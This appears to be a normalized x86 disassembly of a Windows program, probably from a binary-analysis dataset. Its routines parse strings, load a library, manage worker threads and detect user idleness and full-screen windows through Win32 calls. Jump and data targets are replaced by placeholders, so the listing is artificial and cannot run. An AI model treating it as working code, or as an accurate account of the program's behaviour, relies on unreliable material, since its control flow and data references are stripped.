nop
cmp [ edx + eax ] cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ esp + 0x14 ]
sub eax edx
xor esi esi
mov ebx r--data
add ebp eax
call sub_42a390
test ebp ebp
je r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp [ edx + eax ] 0x0
jne r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0xc
retn 0xc
mov edi ebp
sub edi r--data
mov [ esp + 0x28 ] edi
nop
mov cl [ eax ]
test cl cl
je r-xdata
mov eax r--data
nop
cmp [ ebp ] 0x0
je r-xdata
cmp [ edi + eax ] cl
jne r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp [ edi + eax ] 0x0
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add ebp eax
mov ebx [ esp + 0x14 ]
mov eax [ ebx ]
mov esi [ eax ]
inc esi
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
push 0x1
lea edx [ ecx + eax + 0x8 ]
push ebp
push edx
call sub_441f70
mov eax [ ebx ]
mov [ eax ] esi
mov ecx [ ebx ]
inc ebp
inc edi
add esp 0xc
mov [ esi + ecx + 0x8 ] 0x0
mov [ esp + 0x28 ] edi
test ebp ebp
jne r-xdata
mov edi [ eax + 0x4 ]
add edi esi
push ebx
call sub_42a2d0
mov edi [ esp + 0x28 ]
cmp [ ebp ] 0x0
je r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0xc
retn 0xc
sub_42d570
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push ebx
mov ebp ecx
call sub_42c180
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
cmp [ esi ] 0x0
je r-xdata
push edi
mov edi [ esp + 0x18 ]
test edi edi
je r-xdata
lea eax [ ebp + 0x14 ]
push esi
call sub_42c230
add esp 0x4
test eax eax
je r-xdata
push ebx
push esi
call sub_42bf90
mov eax edi
mov ecx [ eax ]
mov [ ebp + 0x4 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
push ebx
push edi
jmp r-xdata
push ebx
call sub_42c180
add esp 0x4
test eax eax
je r-xdata
push esi
push eax
mov eax 0x6
call sub_42c980
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
push ebx
push edi
push eax
push ecx
mov eax 0x6
call sub_42c980
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
cmp cl 0x3d
jne r-xdata
push ebx
inc eax
call sub_42c180
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
cmp al 0x27
jne r-xdata
cmp al 0x22
jne r-xdata
push ebx
push r--data
jmp r-xdata
lea edi [ ebp + 0x18 ]
push edi
mov eax r--data
call sub_42a530
push ebx
push r--data
push 0x0
add ebp 0x18
push ebp
inc esi
push esi
call sub_42c500
add esp 0x14
mov esi eax
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
call sub_42bde0
test al al
jne r-xdata
mov al [ esi ]
cmp al 0x2f
je r-xdata
cmp al 0x3e
je r-xdata
cmp al 0x27
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp al 0x22
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
push edx
push eax
mov ebx edi
call sub_42a5c0
add esi 0x1
jne r-xdata
mov bl [ esi ]
test bl bl
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0xc
sub_42d6f0
push 0xffffffff
push sub_4597b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1c ]
mov [ fs : 0x0 ] eax
mov ebp ecx
mov [ esp + 0x18 ] ebp
lea edi [ ebp + 0x20 ]
xor esi esi
mov ebx r--data
mov [ esp + 0x14 ] edi
call sub_42a390
mov esi ebp
test ebp ebp
je r-xdata
xor ebx ebx
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
mov esi [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
push eax
push ebp
call sub_42bf90
mov ecx [ edi ]
mov esi [ esp + 0x18 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x8 ] edx
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov ebx eax
jmp r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
mov [ esi + 0x2c ] 0x1
mov eax r--data
test ebp ebp
je r-xdata
mov eax r--data
test ebp ebp
je r-xdata
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov edi [ esp + 0x30 ]
mov ebp [ esp + 0x2c ]
test edi edi
je r-xdata
mov edx [ esp + 0x34 ]
push edx
push edi
push ebp
push ebx
mov eax 0xe
call sub_42c980
cmp [ ebp ] 0x0
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x14 ]
push eax
push r--data
push 0x1
push ecx
push ebp
call sub_42c500
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0xc
mov edx ebp
sub edx eax
xor eax eax
jmp r-xdata
dec eax
jmp r-xdata
mov edx ebp
sub edx eax
mov edi edi
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
cmp [ edx + eax ] cl
jne r-xdata
cmp [ edx + eax ] cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
add ebp eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp [ edx + eax ] 0x0
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp [ edx + eax ] 0x0
jne r-xdata
mov [ esp + 0x30 ] rw-data
mov eax [ esp + 0x34 ]
push eax
push r--data
push 0x0
lea ecx [ esp + 0x3c ]
push ecx
push ebp
mov [ esp + 0x38 ] 0x0
call sub_42c500
mov esi eax
mov eax [ esp + 0x44 ]
add esp 0x14
cmp eax rw-data
je r-xdata
mov ebx ebp
sub ebx r--data
mov cl [ eax ]
test cl cl
je r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov eax esi
push eax
call sub_43f960
add esp 0x4
mov eax r--data
cmp [ ebx + eax ] cl
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp [ ebx + eax ] 0x0
jne r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx ]
mov [ esp + 0x30 ] dl
mov esi [ eax ]
inc esi
cmp esi [ eax + 0x4 ]
jbe r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
lea ecx [ esp + 0x34 ]
push ecx
lea eax [ eax + edx + 0x8 ]
push eax
call sub_441f70
mov eax [ esp + 0x20 ]
mov ecx [ eax ]
mov [ ecx ] esi
mov edx [ eax ]
inc ebp
add esp 0xc
inc ebx
mov [ esi + edx + 0x8 ] 0x0
test ebp ebp
jne r-xdata
mov eax [ eax + 0x4 ]
lea edi [ eax + esi ]
push ecx
call sub_42a2d0
mov ecx [ esp + 0x14 ]
mov dl [ ebp ]
test dl dl
je r-xdata
sub_42d910
push 0xffffffff
push sub_459a78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ esp + 0x1c ] ebx
mov edi [ esp + 0xa8 ]
mov eax [ esp + 0xa0 ]
push edi
call sub_42c180
add esp 0x4
mov ebp eax
mov esi ebx
test ebx ebx
je r-xdata
mov [ esp + 0x18 ] 0x0
mov esi [ esp + 0x18 ]
nop
test esi esi
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov esi eax
mov [ esp + 0x18 ] esi
jmp r-xdata
mov esi [ esi + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
cmp [ esi + 0x2c ] 0x0
jne r-xdata
push edi
push 0x1
mov eax r--data
mov ecx ebp
call sub_42c470
add esp 0x8
test al al
je r-xdata
test ebp ebp
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
test eax eax
jne r-xdata
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x30 ] 0xb
mov ebx [ rw-data ]
mov eax ebx
lea edx [ eax + 0x1 ]
nop
mov esi [ esp + 0xa4 ]
test esi esi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ esi + 0x34 ]
mov esi eax
call sub_42a390
mov eax [ esp + 0x18 ]
or ecx 0xffffffff
mov [ eax + 0x40 ] ecx
mov [ eax + 0x3c ] ecx
lea edi [ ebx + 0x2c ]
xor esi esi
mov ebx r--data
add ebp 0x5
mov [ esp + 0x18 ] edi
call sub_42a390
mov edi [ esp + 0x1c ]
add edi 0x30
mov [ esp + 0x20 ] edi
call sub_42a390
mov edi [ esp + 0x1c ]
add edi 0x34
mov [ esp + 0x1c ] edi
call sub_42a390
xor ebx ebx
cmp ebp ebx
je r-xdata
push edi
push ebp
mov edi esi
call sub_42bf90
mov eax [ esi ]
mov [ ebx + 0x4 ] eax
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x8 ] ecx
nop
cmp al 0x3e
je r-xdata
lea eax [ ebp + 0x1 ]
jmp r-xdata
mov esi [ esp + 0xa8 ]
push esi
mov eax ebp
call sub_42c180
mov ebp eax
push esi
push 0x1
mov eax r--data
mov ecx ebp
call sub_42c470
add esp 0xc
test al al
je r-xdata
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x88
retn 0xc
push esi
push 0x1
mov eax r--data
mov ecx ebp
call sub_42c470
add esp 0x8
test al al
je r-xdata
or eax 0xffffffff
mov [ esp + 0x2c ] eax
mov [ esp + 0x28 ] eax
mov eax rw-data
mov [ esp + 0x30 ] ebx
mov [ esp + 0x24 ] r--data
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x40 ] ebx
mov edx [ esp + 0xa4 ]
push esi
push edx
push ebp
lea ecx [ esp + 0x30 ]
mov [ esp + 0xa4 ] ebx
call sub_42d570
mov edi [ esp + 0x3c ]
add edi 0x8
mov ebp eax
mov eax edi
lea esi [ eax + 0x1 ]
push esi
push 0x1
mov eax r--data
mov ecx ebp
call sub_42c470
add esp 0x8
test al al
je r-xdata
or eax 0xffffffff
mov [ esp + 0x50 ] eax
mov [ esp + 0x4c ] eax
mov eax rw-data
mov [ esp + 0x54 ] ebx
mov [ esp + 0x48 ] r--data
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x58 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x64 ] ebx
mov eax [ esp + 0xa4 ]
push esi
push eax
push ebp
lea ecx [ esp + 0x54 ]
mov [ esp + 0xa4 ] 0x1
call sub_42d570
mov edi [ esp + 0x60 ]
add edi 0x8
mov ebp eax
mov eax edi
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
mov ebx edi
mov edi [ esp + 0x18 ]
mov esi eax
call sub_42a390
mov [ esp + 0x98 ] 0xffffffff
mov eax [ esp + 0x3c ]
cmp eax rw-data
je r-xdata
cmp ebp ebx
je r-xdata
or eax 0xffffffff
mov [ esp + 0x74 ] eax
mov [ esp + 0x70 ] eax
mov eax rw-data
mov [ esp + 0x78 ] ebx
mov [ esp + 0x6c ] r--data
mov [ esp + 0x80 ] eax
mov [ esp + 0x84 ] eax
mov [ esp + 0x7c ] ebx
mov [ esp + 0x8c ] ebx
mov [ esp + 0x88 ] ebx
mov ecx [ esp + 0xa4 ]
push esi
push ecx
push ebp
lea ecx [ esp + 0x78 ]
mov [ esp + 0xa4 ] 0x2
call sub_42d570
mov edi [ esp + 0x84 ]
add edi 0x8
mov ebp eax
mov eax edi
lea esi [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
mov ebx edi
mov edi [ esp + 0x20 ]
mov esi eax
call sub_42a390
mov [ esp + 0x98 ] 0xffffffff
mov eax [ esp + 0x60 ]
cmp eax rw-data
je r-xdata
mov eax [ esp + 0x38 ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov al [ ebp ]
mov [ esp + 0x17 ] al
cmp al bl
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov eax [ esp + 0x5c ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
mov [ esp + 0x24 ] r--data
push eax
call sub_43f960
add esp 0x4
cmp ebp ebx
jne r-xdata
cmp al 0x3e
je r-xdata
sub eax esi
mov ebx edi
mov edi [ esp + 0x1c ]
mov esi eax
call sub_42a390
mov [ esp + 0x98 ] 0xffffffff
mov eax [ esp + 0x84 ]
cmp eax rw-data
je r-xdata
mov [ esp + 0x48 ] r--data
jmp r-xdata
push eax
call sub_43f960
add esp 0x4
mov al [ ebp ]
cmp al bl
je r-xdata
jmp r-xdata
movzx edx al
push edx
call sub_4427fa
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x80 ]
cmp eax rw-data
je r-xdata
push eax
call sub_43f960
add esp 0x4
xor ebx ebx
mov al [ esp + 0x17 ]
cmp al 0xa
je r-xdata
mov [ esp + 0x6c ] r--data
jmp r-xdata
push eax
call sub_43f960
add esp 0x4
cmp al 0xd
je r-xdata
add ebp 0x1
jne r-xdata
jmp r-xdata
sub_42dd80
push 0xffffffff
push sub_45978b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2d4
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2e8 ]
mov [ fs : 0x0 ] eax
push r--data
xor esi esi
push r--data
xor edi edi
mov [ esp + 0x28 ] esi
xor ebp ebp
mov [ esp + 0x30 ] esi
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
or eax 0xffffffff
mov ecx [ rw-data ]
push esi
push 0x2c
lea eax [ esp + 0x58 ]
push eax
push ecx
call ebx
test eax eax
jne r-xdata
lea ecx [ ecx ]
push eax
push 0x268
lea eax [ esp + 0x84 ]
push eax
push 0x2
call ebx
test eax eax
jne r-xdata
mov ecx edi
or ecx [ esp + 0x20 ]
jne r-xdata
fild [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
fld [ r--data ]
fmul st1
fild [ esp + 0x34 ]
test ecx ecx
jge r-xdata
mov edx [ esp + 0x80 ]
mov eax [ esp + 0x38 ]
mov edi [ esp + 0x7c ]
mov ebp [ esp + 0x34 ]
push 0x3e8
mov [ esp + 0x24 ] edx
mov [ esp + 0x2c ] eax
call [ Sleep@IAT ]
inc esi
cmp esi 0x2
jl r-xdata
faddp st2
mov [ esp + 0x14 ] ebp
fild [ esp + 0x28 ]
fmul st1
fild [ esp + 0x14 ]
test ebp ebp
jge r-xdata
fadd [ r--data ]
push 0x0
push 0x20
lea edx [ esp + 0x34 ]
push edx
push 0x3
call ebx
test eax eax
jne r-xdata
mov edx [ esp + 0x7c ]
faddp st1
fsubp st2
fild [ esp + 0x80 ]
fmul st1
fild [ esp + 0x7c ]
test edx edx
jge r-xdata
fadd [ r--data ]
faddp st1
mov [ esp + 0x14 ] edi
fild [ esp + 0x20 ]
fmulp st2
fild [ esp + 0x14 ]
test edi edi
jge r-xdata
fadd [ r--data ]
faddp st2
movzx eax [ esp + 0x78 ]
mov [ esp + 0x1c ] eax
mov edx [ rw-data ]
fsubrp st1
mov eax [ edx + 0xc ]
mov ecx rw-data
fdivrp st1
fld [ r--data ]
fmul st1
fild [ esp + 0x1c ]
fdivp st2
fsubrp st1
fadd [ r--data ]
fstp [ esp + 0x24 ]
call eax
add eax 0x10
mov [ esp + 0x1c ] eax
fnstcw [ esp + 0x1a ]
mov [ esp + 0x2f0 ] 0x0
fld [ esp + 0x24 ]
movzx eax [ esp + 0x1a ]
or eax 0xc00
mov [ esp + 0x14 ] eax
lea edi [ esp + 0x1c ]
fldcw [ esp + 0x14 ]
fistp [ esp + 0x24 ]
mov esi [ esp + 0x24 ]
push esi
push r--data
fldcw [ esp + 0x22 ]
call sub_412480
mov [ esp + 0x2f8 ] 0xffffffff
mov eax [ esp + 0x24 ]
add eax 0xfffffff0
add esp 0x8
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
fadd [ r--data ]
mov eax esi
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esp + 0x2e8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2e0
retn
sub_42df90
push 0xffffffff
push sub_45a900
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esp + 0xc ] ebx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] eax
mov [ esp + 0x38 ] eax
lea esi [ ebx + 0x24 ]
mov [ ebx ] r--data
mov [ ebx + 0x20 ] ecx
xor edx edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ ebx + 0x14 ] 0x3e8
mov [ esp + 0x28 ] 0x7
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] dx
lea ecx [ esp + 0x10 ]
mov [ esp + 0x38 ] 0x1
call sub_429250
push 0x7
mov eax r--data
lea ecx [ esp + 0x14 ]
call sub_429170
cmp [ esp + 0x28 ] 0x8
mov edi [ esp + 0x14 ]
jae r-xdata
call sub_42e380
cmp [ esp + 0x28 ] 0x8
jb r-xdata
lea edi [ esp + 0x14 ]
mov eax ebx
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
mov eax [ esp + 0x14 ]
push eax
call sub_43f960
add esp 0x4
sub_42e070
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x30
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x18 ]
mov esi ecx
push eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x1c ] 0x8
call [ GetLastInputInfo@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0x20 ]
cmp eax [ ecx + 0xc ]
jge r-xdata
call [ GetTickCount@IAT ]
mov ecx [ esp + 0x1c ]
cmp eax ecx
ja r-xdata
push 0x0
push r--data
call [ FindWindowW@IAT ]
mov ebp [ SendMessageW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax ecx
xor eax eax
jmp r-xdata
call sub_42e300
test al al
jne r-xdata
push 0x0
push 0x18
push 0x905
push eax
call ebp
cmp eax 0x1
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
lea edx [ esp + 0x20 ]
push edx
call [ GlobalMemoryStatus@IAT ]
mov eax [ esi + 0x20 ]
mov ecx [ esp + 0x24 ]
cmp ecx [ eax + 0x14 ]
jg r-xdata
call eax
test eax eax
jne r-xdata
call sub_42dd80
mov edx [ esi + 0x20 ]
cmp eax [ edx + 0x10 ]
jg r-xdata
mov ebx [ Sleep@IAT ]
mov edi 0x3
jmp r-xdata
mov esi [ esi + 0x20 ]
mov eax [ esi ]
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
dec edi
mov eax 0x3
sub eax edi
imul eax eax 0x64
push eax
call ebx
test edi edi
jg r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push 0x0
push 0x0
push ecx
push edx
call ebp
test eax eax
jne r-xdata
mov esi [ esp + 0x14 ]
pop edi
xor eax eax
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42e190
mov eax 0x1
test [ rw-data ] al
jne r-xdata
mov eax rw-data
retn
or [ rw-data ] eax
xor eax eax
push sub_45b8a0
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x2710
mov [ rw-data ] 0x32
mov [ rw-data ] 0x1e
call sub_4413c3
add esp 0x4
sub_42e1f0
push 0xffffffff
push sub_459b0b
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
test ebx ebx
je r-xdata
xor eax eax
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x10
retn
push ebx
call [ IsWindow@IAT ]
test eax eax
je r-xdata
cmp [ edi ] 0x0
je r-xdata
push 0x2c
mov [ edi ] ebx
mov [ edi + 0x4 ] 0x40a
call sub_43fa1d
add esp 0x4
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x0
test eax eax
je r-xdata
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
xor esi esi
mov ecx edi
mov ebx eax
call sub_42df90
mov esi eax
jmp r-xdata
mov [ edi + 0x8 ] 0x0
push 0x7d0
call sub_42e4b0
test esi esi
je r-xdata
push edi
mov eax esi
call sub_42e450
mov [ edi + 0x8 ] esi
mov eax 0x1
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x10
retn
mov eax esi
call sub_42e2c0
sub_42e2c0
push esi
mov esi eax
mov [ esi ] r--data
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
push 0x7d0
mov [ esi ] r--data
call sub_42e4b0
push esi
call sub_43f960
add esp 0x4
mov eax esi
pop esi
retn
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x24 ] 0x0
sub_42e300
sub esp 0x8
push ebx
push ebp
push esi
mov esi [ GetSystemMetrics@IAT ]
push edi
push 0x0
call esi
push 0x1
mov ebp eax
call esi
mov esi [ WindowFromPoint@IAT ]
mov ecx 0x1
mov edx ecx
push edx
push ecx
mov ebx ecx
lea edi [ eax - 0x1 ]
dec ebp
call esi
push edi
push ebx
mov [ esp + 0x18 ] eax
call esi
mov ebx eax
mov eax 0x1
push eax
push ebp
call esi
push edi
push ebp
mov [ esp + 0x1c ] eax
call esi
mov esi [ esp + 0x10 ]
cmp esi ebx
jne r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x14 ]
cmp ebx ecx
jne r-xdata
cmp ecx eax
jne r-xdata
call [ GetDesktopWindow@IAT ]
cmp esi eax
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_42e380
sub esp 0x20c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x208 ] eax
push ebx
xor eax eax
push 0x206
push eax
lea ecx [ esp + 0xe ]
push ecx
mov ebx 0x1
mov [ esp + 0x10 ] ax
call sub_443360
add esp 0xc
push r--data
push edi
lea edx [ esp + 0xc ]
push edx
call [ PathCombineW@IAT ]
lea eax [ esp + 0x4 ]
push eax
call [ LoadLibraryW@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
pop ebx
mov ecx [ esp + 0x208 ]
xor ecx esp
call sub_43f96b
add esp 0x20c
retn
mov ecx [ esp + 0x20c ]
mov eax ebx
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x20c
retn
mov ecx [ esi ]
push ecx
xor ebx ebx
call [ FreeLibrary@IAT ]
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
sub_42e450
push esi
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
push 0x0
push 0x0
push 0x0
push 0x0
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] 0x1
call [ CreateEventW@IAT ]
lea ecx [ esi + 0x10 ]
push ecx
push 0x0
push esi
push sub_42e560
push 0x0
push 0x0
mov [ esi + 0x8 ] eax
call [ CreateThread@IAT ]
xor edx edx
test eax eax
setne dl
mov [ esi + 0xc ] eax
pop esi
mov eax edx
retn 0x4
push 0x7d0
call sub_42e4b0
sub_42e4b0
push edi
xor edi edi
mov [ esi + 0x4 ] edi
cmp [ esi + 0x10 ] edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
call [ GetCurrentThread@IAT ]
cmp eax [ esi + 0xc ]
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov eax 0x1
pop edi
retn 0x4
push eax
call [ CloseHandle@IAT ]
mov eax [ esi + 0x8 ]
push eax
call [ SetEvent@IAT ]
mov ecx [ esp + 0x8 ]
mov edx [ esi + 0xc ]
push ecx
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
push edi
call [ ExitThread@IAT ]
mov eax [ esi + 0xc ]
push edi
push eax
call [ TerminateThread@IAT ]
sub_42e560
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
mov eax 0x1
je r-xdata
push eax
call sub_42e4b0
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x10 ]
push ecx
mov ecx esi
call edx
xor eax eax
pop esi
retn 0x4
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x10 ]
push ecx
mov ecx esi
call edx
mov [ esi + 0x10 ] 0x0
xor eax eax
pop esi
retn 0x4
push edi
mov edi [ WaitForSingleObject@IAT ]
pop edi
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x8 ]
push eax
push ecx
call edi
cmp eax 0x102
jne r-xdata
test eax eax
jne r-xdata
mov edx [ esi ]
mov eax [ esi + 0x18 ]
mov edx [ edx + 0x4 ]
push eax
jmp r-xdata
mov eax [ esi ]
mov edx [ eax ]
cmp [ esi + 0x4 ] eax
je r-xdata
mov ecx esi
call edx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
jmp r-xdata
mov ecx [ esi + 0x18 ]
push ecx
sub_42e600
push 0xffffffff
push sub_45abcb
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x20 ]
xor ebx ebx
mov [ esp + 0x18 ] ebx
mov ecx [ esi + 0xc ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
mov [ esi + 0xc ] ebx
mov [ esi ] ebx
mov eax [ esi + 0x1c ]
cmp eax ebx
je r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x8 ] ebx
mov eax [ esi + 0x10 ]
push eax
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xc
retn 0x4
mov ecx [ esp + 0x20 ]
mov edi [ esi + 0x20 ]
push ecx
call sub_429630
mov edx [ esi + 0x1c ]
push edx
call sub_43f960
add esp 0x8
sub_42e6a0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_45b0f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x480
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x478 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x490 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
mov [ esp + 0x18 ] eax
mov edi ecx
mov [ eax + 0x4 ] 0x0
je r-xdata
mov ebx [ eax + 0x20 ]
lea esi [ eax + 0x10 ]
mov [ esp + 0x14 ] esi
cmp [ esi + 0xc ] ebx
